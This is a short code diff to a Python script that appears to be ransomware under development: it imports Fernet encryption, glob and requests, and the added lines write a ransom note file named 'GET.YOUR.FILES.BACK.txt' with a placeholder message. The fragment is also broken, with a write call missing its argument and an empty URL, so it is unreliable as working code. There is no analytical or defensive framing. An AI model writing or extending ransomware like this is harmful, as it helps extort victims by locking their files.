@@ -2,7 +2,10 @@ import glob
 from cryptography.fernet import Fernet
 import os
 import requests
-
+ransom_message = '''your message'''
+ransom_message_txt = open("GET.YOUR.FILES.BACK.txt", 'wb')
+ransom_message_txt.write()
+ransom_message_txt.close()
 session = requests.session()
 url = ('')
 response = session.get(url, allow_redirects=True)
